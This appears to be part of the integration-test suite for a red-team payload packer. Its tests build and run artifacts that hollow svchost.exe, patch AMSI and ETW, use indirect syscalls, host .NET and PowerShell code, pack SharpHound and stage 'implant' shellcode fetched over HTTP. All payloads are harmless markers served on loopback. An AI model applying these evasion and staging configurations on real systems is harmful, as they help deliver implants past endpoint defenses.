    assert!(
        written.contains("tls=42"),
        "the target thread's TLS was not provisioned: {written}"
    );
}

/// End-to-end: `process_hollowing` runs a payload inside `svchost.exe` — the
/// payload writes its marker and `thread_local` value to a file and exits 42.
/// `#[ignore]`: needs `rustc`, the compiled dependencies and a Windows host.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
fn packs_and_runs_a_hollowed_payload() {
    if !cfg!(windows) {
        return;
    }
    let payload = build_hollow_payload(None);
    let artifact = pack_hollowing_payload("hollow_x64", &payload, "x64");
    assert_hollowed_run(&artifact, "hollow_x64");
}

/// End-to-end x86: a 32-bit stub hollows a 32-bit target (the default
/// `System32\svchost.exe`, which WOW64 redirects to `SysWOW64`), sets up the
/// `CONTEXT32` entry hand-off and the `fs:[0x2C]` TLS slot, and the payload
/// writes its marker and `thread_local` value before exiting 42.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc, the i686 target and a Windows host"]
fn packs_and_runs_an_x86_hollowed_payload() {
    if !cfg!(windows) {
        return;
    }
    let payload = build_hollow_payload(Some(x86_target()));
    let artifact = pack_hollowing_payload("hollow_x86", &payload, "x86");
    assert_hollowed_run(&artifact, "hollow_x86");
}

// --- x86 preparations (M3) ---

/// End-to-end x86: every Preparation that accepts `arch: x86` runs in a 32-bit
/// stub before the payload — `anti_debug` (x86 debug-register `CONTEXT`),
/// `patch_amsi`, `patch_etw` (arch-neutral patches) and `bouncer` (a
/// trivially-passing check) — and the payload still runs.
///
/// `#[ignore]`: needs `rustc`, the `i686` target and a Windows host.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc, the i686 target and a Windows host"]
fn x86_preparations_run_before_the_payload() {
    if !cfg!(windows) {
        return;
    }

    // The plain marker payload: it prints to stdout, which the stub's own
    // console shows (a hollowed payload would not).
    let src = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("examples")
        .join("payloads")
        .join("test_payload.rs");
    let payload = std::env::temp_dir().join(format!("picaro_x86_prep_{}.exe", std::process::id()));
    let status = Command::new("rustc")
        .arg(&src)
        .arg("--target")
        .arg(x86_target())
        .args(["-O", "-C", "strip=symbols", "-o"])
        .arg(&payload)
        .status()
        .expect("run rustc to build the 32-bit payload");
    assert!(status.success(), "the 32-bit payload must compile");
    let source = payload.display().to_string().replace('\\', "/");
    let plan = format!(
        r#"schema: 6
name: x86_preparations
build:
  crypto:
    algo: xchacha20poly1305
    key: random
  payloads:
    payload:
      source: "{source}"
  output:
    path: ./dist/x86_preparations.exe
    arch: x86
    strip: true
    trim_paths: all
runtime:
  - technique: anti_debug
  - technique: patch_amsi
  - technique: patch_etw
  - technique: bouncer
    params:
      require: [{{ ram_mb: 1 }}]
  - technique: reflective_loading
    params: {{ payload: payload }}
"#
    );
    let plan_path =
        std::env::temp_dir().join(format!("picaro_x86_prep_{}.yaml", std::process::id()));
    std::fs::write(&plan_path, plan).expect("write the temp plan");

    let output = Command::new(env!("CARGO_BIN_EXE_picaro"))
        .args(["build", plan_path.to_str().expect("utf-8 plan path")])
        .output()
        .expect("run picaro build");
    assert!(
        output.status.success(),
        "x86 preparation build failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let run = Command::new("dist/x86_preparations.exe")
        .output()
        .expect("run the packed x86 binary");
    let stdout = String::from_utf8_lossy(&run.stdout);
    assert!(
        stdout.contains("PAYLOAD_MARKER_7f3a9c2e"),
        "the payload did not run after the preparations: status={:?} stdout={stdout} stderr={}",
        run.status,
        String::from_utf8_lossy(&run.stderr)
    );
}

// --- .NET hosting (M5) ---

/// A build plan for a managed payload: `source` is the full path relative to the
/// crate root, and `format`, `arch` and `technique` are the parameters, since the
/// point of these tests is the coupling between them.
fn managed_plan(name: &str, source: &str, format: &str, arch: &str, technique: &str) -> String {
    format!(
        r#"schema: 6
name: {name}
build:
  crypto:
    algo: xchacha20poly1305
    key: random
  payloads:
    payload:
      source: {source}
      format: {format}
  output:
    path: ./dist/{name}.exe
    arch: {arch}
    strip: true
    trim_paths: all
runtime:
  - technique: {technique}
    params: {{ payload: payload }}
"#
    )
}

/// A managed image is not native code: `format: pe` must fail at build time with
/// a message that says what to use instead, instead of failing inside the CLR at
/// run time. Hermetic (no `rustc` needed: the rejection happens in `--dry-run`).
#[test]
fn build_rejects_a_dotnet_payload_with_format_pe() {
    let plan = write_temp_plan(
        "picaro_dotnet_pe.yaml",
        &managed_plan(
            "dotnet_pe",
            "./tests/fixtures/managed_x86.exe",
            "pe",
            "x86",
            "reflective_loading",
        ),
    );
    let output = picaro(&["--quiet".as_ref(), "build".as_ref(), plan.as_os_str()]);
    assert!(
        !output.status.success(),
        "a managed image must not be packed as native code"
    );
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("is a .NET assembly") && stderr.contains("format: dotnet"),
        "unclear error: {stderr}"
    );
}

/// The CLR of the stub's bitness runs the assembly, so a `32BITREQUIRED`
/// assembly cannot be packed for x64.
#[test]
fn build_rejects_a_managed_payload_of_the_wrong_bitness() {
    let plan = write_temp_plan(
        "picaro_dotnet_bits.yaml",
        &managed_plan(
            "dotnet_bits",
            "./tests/fixtures/managed_x86.exe",
            "dotnet",
            "x64",
            "dotnet_hosting",
        ),
    );
    let output = picaro(&["--quiet".as_ref(), "build".as_ref(), plan.as_os_str()]);
    assert!(
        !output.status.success(),
        "a 32-bit assembly needs a 32-bit runtime"
    );
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("32BITREQUIRED"), "unclear error: {stderr}");
}

/// `format: dotnet` and `technique: dotnet_hosting` imply each other.
#[test]
fn build_rejects_a_dotnet_format_without_the_hosting_technique() {
    let plan = write_temp_plan(
        "picaro_dotnet_tech.yaml",
        &managed_plan(
            "dotnet_tech",
            "./tests/fixtures/managed_x86.exe",
            "dotnet",
            "x86",
            "reflective_loading",
        ),
    );
    let output = picaro(&["--quiet".as_ref(), "build".as_ref(), plan.as_os_str()]);
    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("dotnet_hosting"), "unclear error: {stderr}");
}

/// `format: powershell` and `technique: powershell_hosting` imply each other.
#[test]
fn build_rejects_a_powershell_format_without_the_hosting_technique() {
    let plan = write_temp_plan(
        "picaro_ps_tech.yaml",
        &managed_plan(
            "ps_tech",
            "./examples/payloads/demo_script.ps1",
            "powershell",
            "x64",
            "reflective_loading",
        ),
    );
    let output = picaro(&["--quiet".as_ref(), "build".as_ref(), plan.as_os_str()]);
    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("powershell_hosting"),
        "unclear error: {stderr}"
    );
}

/// `powershell_hosting` runs only a `.ps1`: a native payload is rejected.
#[test]
fn build_rejects_a_pe_payload_with_powershell_hosting() {
    let plan = write_temp_plan(
        "picaro_ps_pe.yaml",
        &managed_plan(
            "ps_pe",
            "./tests/fixtures/minimal_x64.exe",
            "pe",
            "x64",
            "powershell_hosting",
        ),
    );
    let output = picaro(&["--quiet".as_ref(), "build".as_ref(), plan.as_os_str()]);
    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("powershell"), "unclear error: {stderr}");
}

/// End-to-end: a 32-bit managed assembly is loaded from memory by the CLR the
/// stub hosts, its `Main` runs (with the payload args) and its exit code comes
/// back through the stub.
///
/// `#[ignore]`: compiles a stub, and needs a Windows host with .NET Framework.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
fn packs_and_runs_a_managed_payload() {
    if !cfg!(windows) {
        return;
    }
    let plan = write_temp_plan(
        "picaro_managed_x86.yaml",
        &managed_plan(
            "managed_x86",
            "./tests/fixtures/managed_x86.exe",
            "dotnet",
            "x86",
            "dotnet_hosting",
        )
        .replace(
            "      format: dotnet\n",
            "      format: dotnet\n      args:\n        - one\n        - two\n",
        ),
    );

    let build = picaro(&["build".as_ref(), plan.as_os_str()]);
    assert!(
        build.status.success(),
        "managed build failed: {}",
        String::from_utf8_lossy(&build.stderr)
    );

    let run = Command::new("dist/managed_x86.exe")
        .output()
        .expect("run the packed managed binary");
    let stdout = String::from_utf8_lossy(&run.stdout);
    assert!(
        stdout.contains("MANAGED_MARKER_7f3a9c2e"),
        "the managed payload did not run: status={:?} stdout={stdout} stderr={}",
        run.status,
        String::from_utf8_lossy(&run.stderr)
    );
    assert!(
        stdout.contains("args=2"),
        "the managed entry point did not receive the payload args: {stdout}"
    );
    assert!(
        stdout.contains("x64=False"),
        "a 32-bit assembly must run on the 32-bit CLR: {stdout}"
    );
    assert_eq!(
        run.status.code(),
        Some(42),
        "the managed exit code must come back through the stub"
    );
}

/// End-to-end on x64: an AnyCPU assembly runs on the 64-bit CLR.
///
/// `#[ignore]`: compiles a stub, and needs a Windows host with .NET Framework.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
fn packs_and_runs_a_managed_payload_on_x64() {
    if !cfg!(windows) {
        return;
    }
    let plan = write_temp_plan(
        "picaro_managed_x64.yaml",
        &managed_plan(
            "managed_x64",
            "./tests/fixtures/managed_anycpu.exe",
            "dotnet",
            "x64",
            "dotnet_hosting",
        ),
    );

    let build = picaro(&["build".as_ref(), plan.as_os_str()]);
    assert!(
        build.status.success(),
        "managed x64 build failed: {}",
        String::from_utf8_lossy(&build.stderr)
    );

    let run = Command::new("dist/managed_x64.exe")
        .output()
        .expect("run the packed managed binary");
    let stdout = String::from_utf8_lossy(&run.stdout);
    assert!(
        stdout.contains("MANAGED_MARKER_7f3a9c2e") && stdout.contains("x64=True"),
        "the AnyCPU assembly did not run on the 64-bit CLR: {stdout}"
    );
    assert_eq!(run.status.code(), Some(42));
}

/// End-to-end: a `.ps1` is embedded, compiled to a managed launcher at build
/// time and run in-process by the CLR the stub hosts — no `powershell.exe`.
///
/// `#[ignore]`: compiles a stub and a managed launcher (needs `rustc`, `csc.exe`
/// and a Windows host with Windows PowerShell 5.1).
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc, csc.exe and a Windows host with Windows PowerShell"]
fn packs_and_runs_a_powershell_payload() {
    if !cfg!(windows) {
        return;
    }
    let plan = write_temp_plan(
        "picaro_powershell.yaml",
        r#"schema: 6
name: ps_marker
build:
  payloads:
    script:
      source: ./examples/payloads/demo_script.ps1
      format: powershell
  output:
    path: ./dist/ps_marker.exe
runtime:
  - technique: patch_amsi
  - technique: powershell_hosting
    params:
      payload: script
      command: Get-PicaroMarker | Out-File -Encoding ascii ./dist/ps_marker.out
"#,
    );

    let build = picaro(&["build".as_ref(), plan.as_os_str()]);
    assert!(
        build.status.success(),
        "powershell build failed: {}",
        String::from_utf8_lossy(&build.stderr)
    );

    // The script's effect is asserted through a file it writes (not stdout). On a
    // host with Defender's real-time protection enabled, the AMSI patch is
    // intermittently interfered with, so the hosted engine may not run on every
    // launch; retry a few times. A Defender-off lab host is stable (see
    // `docs/measurements.md`).
    let marker_path = "dist/ps_marker.out";
    let mut ran = false;
    for _ in 0..6 {
        let _ = std::fs::remove_file(marker_path);
        let _ = Command::new("dist/ps_marker.exe").output();
        let wrote = std::fs::read_to_string(marker_path)
            .map(|marker| marker.contains("picaro-ok"))
            .unwrap_or(false);
        if wrote {
            ran = true;
            break;
        }
    }
    assert!(ran, "the hosted script did not run in 6 attempts");
    let _ = std::fs::remove_file(marker_path);
}

/// `import_powermodule` builds a managed module: it needs `kind: psmodule`.
#[test]
fn build_rejects_import_powermodule_without_the_psmodule_kind() {
    let plan = write_temp_plan(
        "picaro_psmodule_kind.yaml",
        &managed_plan(
            "psmod_kind",
            "./examples/payloads/demo_script.ps1",
            "powershell",
            "x64",
            "import_powermodule",
        ),
    );
    let output = picaro(&["--quiet".as_ref(), "build".as_ref(), plan.as_os_str()]);
    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("psmodule"), "unclear error: {stderr}");
}

/// A `kind: psmodule` build needs at least one `import_powermodule` step.
#[test]
fn build_rejects_a_psmodule_without_an_import_step() {
    let plan = write_temp_plan(
        "picaro_psmodule_empty.yaml",
        r#"schema: 6
name: empty_module
build:
  payloads:
    script:
      source: ./examples/payloads/demo_script.ps1
      format: powershell
  output:
    kind: psmodule
    path: ./dist/empty_module.dll
runtime:
  - technique: patch_amsi
"#,
    );
    let output = picaro(&["--quiet".as_ref(), "build".as_ref(), plan.as_os_str()]);
    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("import_powermodule"),
        "unclear error: {stderr}"
    );
}

/// End-to-end: a `kind: psmodule` artifact is imported by PowerShell and its
/// function lands in the importing session, with no `.ps1` on disk.
///
/// `#[ignore]`: compiles a managed module (needs `rustc`, `csc.exe` and a Windows
/// host with Windows PowerShell 5.1).
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc, csc.exe and a Windows host with Windows PowerShell"]
fn packs_and_imports_a_powershell_module() {
    if !cfg!(windows) {
        return;
    }
    let plan = write_temp_plan(
        "picaro_psmodule.yaml",
        r#"schema: 6
name: psmod
build:
  payloads:
    script:
      source: ./examples/payloads/demo_script.ps1
      format: powershell
  output:
    kind: psmodule
    path: ./dist/psmod.dll
runtime:
  - technique: patch_amsi
  - technique: import_powermodule
    params:
      payload: script
"#,
    );

    let build = picaro(&["build".as_ref(), plan.as_os_str()]);
    assert!(
        build.status.success(),
        "psmodule build failed: {}",
        String::from_utf8_lossy(&build.stderr)
    );

    let run = Command::new("powershell")
        .args([
            "-NoProfile",
            "-ExecutionPolicy",
            "Bypass",
            "-Command",
            "Import-Module ./dist/psmod.dll; Get-PicaroMarker",
        ])
        .output()
        .expect("run powershell");
    let stdout = String::from_utf8_lossy(&run.stdout);
    assert!(
        stdout.contains("picaro-ok"),
        "the module did not inject the function: status={:?} stdout={stdout} stderr={}",
        run.status,
        String::from_utf8_lossy(&run.stderr)
    );
}

/// Acceptance case: the real-world managed assembly dropped in
/// `tests/fixtures/` (`SharpHound.exe`, a 32-bit .NET assembly) packs and runs,
/// and behaves the same as it does unpacked.
///
/// `#[ignore]`: it needs `SharpHound.exe` (not committed) plus a Windows host.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires SharpHound.exe in tests/fixtures/ and a Windows host"]
fn packs_and_runs_sharphound() {
    if !cfg!(windows) || !Path::new("tests/fixtures/SharpHound.exe").exists() {
        return;
    }
    let plan = write_temp_plan(
        "picaro_sharphound.yaml",
        &managed_plan(
            "sharphound",
            "./tests/fixtures/SharpHound.exe",
            "dotnet",
            "x86",
            "dotnet_hosting",
        ),
    );

    let build = picaro(&["build".as_ref(), plan.as_os_str()]);
    assert!(
        build.status.success(),
        "SharpHound build failed: {}",
        String::from_utf8_lossy(&build.stderr)
    );

    let run = Command::new("dist/sharphound.exe")
        .output()
        .expect("run the packed SharpHound");
    let stdout = String::from_utf8_lossy(&run.stdout);
    assert!(
        stdout.contains("SharpHound Version"),
        "SharpHound did not start inside the stub: stdout={stdout} stderr={}",
        String::from_utf8_lossy(&run.stderr)
    );

    // The acceptance criterion is not just "it starts": the packed assembly must
    // behave like the original. Running both and comparing the output catches a
    // host that loads the assembly but hands it the wrong environment. SharpHound
    // timestamps every line with sub-second precision, so the timestamps are
    // stripped before comparing.
    let direct = Command::new("./tests/fixtures/SharpHound.exe")
        .output()
        .expect("run the unpacked SharpHound");
    assert_eq!(
        without_timestamps(&direct.stdout),
        without_timestamps(&run.stdout),
        "the packed assembly does not behave like the original"
    );
}

/// Drop the leading `<timestamp>|` of every line, so two runs of a logging tool
/// can be compared.
#[cfg(feature = "live-tests")]
fn without_timestamps(stdout: &[u8]) -> String {
    String::from_utf8_lossy(stdout)
        .lines()
        .map(|line| line.split_once('|').map_or(line, |(_, rest)| rest))
        .collect::<Vec<_>>()
        .join("\n")
}

// --- DLL output (build.output.kind: dll) ---

/// Loads a packed DLL into *this* process — the test binary becomes the host —
/// and calls `export`, returning the value the export reports.
///
/// The module is mapped with `LoadLibraryW` and the entry point found with
/// `GetProcAddress` (windows-rs); the raw call is the only `unsafe` and it stays
/// in this one place. Windows-only: the `windows` crate is `#![cfg(windows)]`,
/// so the lint job on Linux cannot compile this.
#[cfg(windows)]
#[cfg(feature = "live-tests")]
fn load_dll_and_call(dll: &Path, export: &str) -> i32 {
    use windows::core::{PCSTR, PCWSTR};
    use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryW};

    let wide: Vec<u16> = dll
        .to_string_lossy()
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect();
    let module = unsafe { LoadLibraryW(PCWSTR(wide.as_ptr())) }
        .expect("LoadLibraryW must map the packed DLL");

    let name = std::ffi::CString::new(export).expect("an export name");
    let address = unsafe { GetProcAddress(module, PCSTR(name.as_ptr().cast())) }
        .expect("the export must exist in the packed DLL");

    // SAFETY: the plain export has the rundll32 shape — four ignored arguments
    // and an `i32` return — and the module stays loaded for the call.
    let run: unsafe extern "system" fn(
        *mut core::ffi::c_void,
        *mut core::ffi::c_void,
        *const u8,
        i32,
    ) -> i32 = unsafe { std::mem::transmute(address) };
    unsafe {
        run(
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null(),
            0,
        )
    }
}

/// End-to-end: a `kind: dll` artifact is loaded by a host process — this test
/// binary — and its export runs the chain. The fixture's shellcode returns `42`,
/// which the export reports back, so the value proves the chain ran rather than
/// that the module merely mapped.
///
/// `#[ignore]`: compiles a stub and needs a Windows host, since the artifact is
/// loaded by the image loader of the process that loads it.
#[cfg(windows)]
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
fn a_dll_artifact_runs_the_chain_when_a_host_loads_it() {
    let build = picaro(&["build".as_ref(), "tests/plans/dll.yaml".as_ref()]);
    assert!(
        build.status.success(),
        "DLL build failed: {}",
        String::from_utf8_lossy(&build.stderr)
    );

    let artifact = Path::new("dist/test_dll.dll");
    let bytes = std::fs::read(artifact).expect("read the DLL");
    assert_eq!(&bytes[..2], b"MZ", "the artifact must be a PE");

    assert_eq!(
        load_dll_and_call(artifact, "Run"),
        42,
        "the chain must run through the export"
    );
}

/// Every SSN resolver builds a stub that reaches the kernel and runs the
/// payload: `mode: indirect` with reflective loading, once per resolver
/// (`hells_gate`, `tartarus_gate`, `api_hash`, `halos_gate`). Windows-only,
/// since the stub is a Windows PE and indirect syscalls are x64-only.
///
/// `#[ignore]`: compiles four stubs and runs them, so it belongs to the
/// hand-run lab suite (`cargo test --features live-tests -- --ignored`).
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
fn indirect_syscall_resolvers_run_the_payload() {
    if !cfg!(windows) {
        return;
    }

    const MARKER: &str = "PAYLOAD_MARKER_7f3a9c2e";

    for resolver in ["hells_gate", "tartarus_gate", "api_hash", "halos_gate"] {
        let artifact = format!("dist/picaro_resolver_{resolver}.exe");
        let _ = std::fs::remove_file(&artifact);
        let plan = write_temp_plan(
            &format!("picaro_resolver_{resolver}.yaml"),
            &format!(
                "schema: 6\nname: resolver-{resolver}\nbuild:\n  payloads:\n    payload:\n      \
                 source: ./examples/payloads/test_payload.exe\n  stub:\n    syscalls:\n      mode: \
                 indirect\n      resolver: {resolver}\n  output:\n    path: ./{artifact}\nruntime:\n  - \
                 technique: reflective_loading\n"
            ),
        );

        let build = picaro(&["--quiet".as_ref(), "build".as_ref(), plan.as_os_str()]);
        assert!(
            build.status.success(),
            "build {resolver} failed: {}",
            String::from_utf8_lossy(&build.stderr)
        );

        let run = Command::new(&artifact)
            .output()
            .expect("run the packed binary");
        let stdout = String::from_utf8_lossy(&run.stdout);
        assert!(
            run.status.success() && stdout.contains(MARKER),
            "{resolver}: the payload did not run: status={:?} stdout={stdout} stderr={}",
            run.status,
            String::from_utf8_lossy(&run.stderr)
        );
    }
}

/// `veh_execution` stages the shellcode in an RX region and enters it by
/// redirecting an `int3` through a vectored handler. The fixture returns `42`,
/// so the artifact's exit code proves the handler redirected execution, the
/// payload ran on the dedicated stack, and the trampoline returned to the
/// loader's trigger.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
fn packs_and_runs_a_veh_execution_payload() {
    if !cfg!(windows) {
        return;
    }

    let artifact = "dist/picaro_veh_execution.exe";
    let _ = std::fs::remove_file(artifact);
    let plan = write_temp_plan(
        "picaro_veh_execution.yaml",
        "schema: 6\nname: veh-execution\nbuild:\n  payloads:\n    payload:\n      source: \
         ./examples/payloads/demo_shellcode.bin\n      format: shellcode\n  stub:\n    syscalls:\n      \
         mode: indirect\n      resolver: api_hash\n  output:\n    path: ./dist/picaro_veh_execution.exe\n\
         runtime:\n  - technique: veh_execution\n",
    );

    let build = picaro(&["--quiet".as_ref(), "build".as_ref(), plan.as_os_str()]);
    assert!(
        build.status.success(),
        "veh_execution build failed: {}",
        String::from_utf8_lossy(&build.stderr)
    );

    let run = Command::new(artifact)
        .output()
        .expect("run the packed binary");
    assert_eq!(
        run.status.code(),
        Some(42),
        "the payload did not run through the vectored handler: stdout={} stderr={}",
        String::from_utf8_lossy(&run.stdout),
        String::from_utf8_lossy(&run.stderr)
    );
}

// --- network stager (live) ---

/// `mov eax, code; ret`: a shellcode that returns `code` to the loader, so the
/// artifact's exit code proves which copy of the payload ran.
#[cfg(feature = "live-tests")]
fn exits_with(code: u8) -> Vec<u8> {
    vec![0xB8, code, 0x00, 0x00, 0x00, 0xC3]
}

/// Serves `body` on a loopback port (a few connections, then the thread is left
/// to die with the test process) and returns the URL.
#[cfg(feature = "live-tests")]
fn serve_payload(body: Vec<u8>) -> String {
    use std::io::{Read, Write};

    let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("bind loopback");
    let port = listener.local_addr().expect("local addr").port();
    std::thread::spawn(move || {
        for _ in 0..4 {
            let Ok((mut stream, _)) = listener.accept() else {
                break;
            };
            let mut request = [0u8; 1024];
            let _ = stream.read(&mut request);
            let header = format!(
                "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                body.len()
            );
            let _ = stream.write_all(header.as_bytes());
            let _ = stream.write_all(&body);
            let _ = stream.flush();
        }
    });
    format!("http://127.0.0.1:{port}/implant.bin")
}

/// A URL on a loopback port nothing listens on: the fetch fails at connect.
#[cfg(feature = "live-tests")]
fn closed_loopback_url() -> String {
    let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("bind loopback");
    let port = listener.local_addr().expect("local addr").port();
    drop(listener);
    format!("http://127.0.0.1:{port}/implant.bin")
}

/// A stager plan: `implant` is staged from `url` and run reflectively.
#[cfg(feature = "live-tests")]
fn stager_plan(name: &str, url: &str, downloader: &str, fallback: &str, source: &str) -> String {
    format!(
        r#"schema: 6
name: {name}
build:
  crypto:
    algo: xchacha20poly1305
    key: random
  payloads:
    implant:
      source: "{source}"
      format: shellcode
  output:
    path: ./dist/{name}.exe
    strip: true
    trim_paths: all
runtime:
  - technique: network_stager
    params:
      payload: implant
      url: "{url}"
      downloader: {downloader}
      fallback: {fallback}
  - technique: reflective_loading
    params: {{ payload: implant }}
"#
    )
}

/// Builds a stager plan and returns the artifact path.
#[cfg(feature = "live-tests")]
fn build_stager(name: &str, plan: &str) -> PathBuf {
    let plan_path = write_temp_plan(&format!("picaro_stager_{name}.yaml"), plan);
    let build = picaro(&["--quiet".as_ref(), "build".as_ref(), plan_path.as_os_str()]);
    assert!(
        build.status.success(),
        "{name} build failed: {}",
        String::from_utf8_lossy(&build.stderr)
    );
    PathBuf::from(format!("dist/{name}.exe"))
}

/// End-to-end: a strictly staged payload is fetched over the in-process WinHTTP
/// transport and runs. The served shellcode returns `43` and the artifact
/// embeds nothing, so the exit code proves the fetched bytes ran.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
fn stages_and_runs_a_payload_over_winhttp() {
    if !cfg!(windows) {
        return;
    }
    let url = serve_payload(exits_with(43));
    let artifact = build_stager(
        "stager_winhttp",
        &stager_plan(
            "stager_winhttp",
            &url,
            "winhttp",
            "none",
            "./examples/payloads/demo_shellcode.bin",
        ),
    );
    let run = Command::new(&artifact)
        .output()
        .expect("run the staged artifact");
    assert_eq!(
        run.status.code(),
        Some(43),
        "the fetched payload did not run: stdout={} stderr={}",
        String::from_utf8_lossy(&run.stdout),
        String::from_utf8_lossy(&run.stderr)
    );
}

/// End-to-end, the best-of-both shape with a reachable server: `fallback:
/// embedded` prefers the fetched copy (the embedded shellcode returns `42`, the
/// served one `43`).
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
fn a_staged_payload_with_a_fallback_prefers_the_fetched_copy() {
    if !cfg!(windows) {
        return;
    }
    let url = serve_payload(exits_with(43));
    let artifact = build_stager(
        "stager_fallback_up",
        &stager_plan(
            "stager_fallback_up",
            &url,
            "winhttp",
            "embedded",
            "./examples/payloads/demo_shellcode.bin",
        ),
    );
    let run = Command::new(&artifact)
        .output()
        .expect("run the staged artifact");
    assert_eq!(
        run.status.code(),
        Some(43),
        "the fetch was expected to win: stdout={} stderr={}",
        String::from_utf8_lossy(&run.stdout),
        String::from_utf8_lossy(&run.stderr)
    );
}

/// End-to-end, the offline half of the same shape: with the fetch failing at
/// connect, the artifact runs the embedded copy (exit `42`) instead of failing
/// the chain.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
fn a_staged_payload_with_a_fallback_runs_the_embedded_copy_when_the_fetch_fails() {
    if !cfg!(windows) {
        return;
    }
    let url = closed_loopback_url();
    let artifact = build_stager(
        "stager_fallback_down",
        &stager_plan(
            "stager_fallback_down",
            &url,
            "winhttp",
            "embedded",
            "./examples/payloads/demo_shellcode.bin",
        ),
    );
    let run = Command::new(&artifact)
        .output()
        .expect("run the staged artifact");
    assert_eq!(
        run.status.code(),
        Some(42),
        "the embedded fallback did not run: stdout={} stderr={}",
        String::from_utf8_lossy(&run.stdout),
        String::from_utf8_lossy(&run.stderr)
    );
}

/// End-to-end regression for the child-process transport after the transport
/// split: `downloader: curl` fetches the payload through the child and the
/// artifact still runs it. Skipped where `curl` is not on the PATH.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc, the compiled dependencies, curl and a Windows host"]
fn stages_and_runs_a_payload_over_a_child_downloader() {
    if !cfg!(windows) || Command::new("curl").arg("--version").output().is_err() {
        return;
    }
    let url = serve_payload(exits_with(43));
    let artifact = build_stager(
        "stager_curl",
        &stager_plan(
            "stager_curl",
            &url,
            "curl",
            "none",
            "./examples/payloads/demo_shellcode.bin",
        ),
    );
    let run = Command::new(&artifact)
        .output()
        .expect("run the staged artifact");
    assert_eq!(
        run.status.code(),
        Some(43),
        "the child-downloaded payload did not run: stdout={} stderr={}",
        String::from_utf8_lossy(&run.stdout),
        String::from_utf8_lossy(&run.stderr)
    );
}

/// End-to-end: the wire crypto (`crypto: xchacha20poly1305` on the step)
/// decrypts the fetched blob in the stub. The served bytes are a fixed
/// ciphertext of the `exits_with(43)` shellcode and the plan carries the
/// matching key/nonce, so a clean exit `43` proves the decrypt path ran.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc, the compiled dependencies and a Windows host"]
fn stages_a_wire_encrypted_payload_over_winhttp() {
    if !cfg!(windows) {
        return;
    }
    const KEY: &str = "1b551ffd11cee55cf16e1a6ca8fe5395bdc15c5e0f5e2161a997a8de9dd3b2b6";
    const NONCE: &str = "f3e1c6fedbac7bb38dfb65a131d7d17f3e5009a469e79002";
    // XChaCha20-Poly1305 ciphertext (with its 16-byte tag) of `mov eax, 43;
    // ret`, generated once for this test.
    let ciphertext: Vec<u8> = vec![
        0xae, 0x3e, 0x8d, 0x85, 0x85, 0xb4, 0xc3, 0xfe, 0x63, 0xdb, 0xbc, 0xc4, 0x5e, 0x8e, 0x92,
        0x5e, 0xcf, 0x46, 0xdb, 0x66, 0xf3, 0x11,
    ];
    let url = serve_payload(ciphertext);
    let plan = stager_plan(
        "stager_winhttp_crypto",
        &url,
        "winhttp",
        "none",
        "./examples/payloads/demo_shellcode.bin",
    )
    .replace(
        "      fallback: none\n",
        &format!(
            "      fallback: none\n      crypto: xchacha20poly1305\n      key: \"{KEY}\"\n      nonce: \"{NONCE}\"\n"
        ),
    );
    let artifact = build_stager("stager_winhttp_crypto", &plan);
    let run = Command::new(&artifact)
        .output()
        .expect("run the staged artifact");
    assert_eq!(
        run.status.code(),
        Some(43),
        "the wire-encrypted payload did not run: stdout={} stderr={}",
        String::from_utf8_lossy(&run.stdout),
        String::from_utf8_lossy(&run.stderr)
    );
}

// --- in-process preparations: probe payload ---

/// Compiles `examples/payloads/probe_payload.rs` once and returns its path.
#[cfg(feature = "live-tests")]
fn build_probe_payload() -> PathBuf {
    static BUILT: std::sync::OnceLock<PathBuf> = std::sync::OnceLock::new();
    BUILT
        .get_or_init(|| {
            let src = Path::new(env!("CARGO_MANIFEST_DIR"))
                .join("examples")
                .join("payloads")
                .join("probe_payload.rs");
            let out = std::env::temp_dir().join(format!("picaro_probe_{}.exe", std::process::id()));
            let status = Command::new("rustc")
                .arg(&src)
                .args(["-O", "-C", "strip=symbols", "-o"])
                .arg(&out)
                .status()
                .expect("run rustc to build the probe payload");
            assert!(status.success(), "the probe payload must compile");
            out
        })
        .clone()
}

/// Packs the probe payload with an optional Preparation step (YAML lines,
/// leading indentation included; empty for the control build) and returns the
/// artifact path.
#[cfg(feature = "live-tests")]
fn pack_probe(name: &str, preparation: &str, args: &[&str], payload: &Path) -> PathBuf {
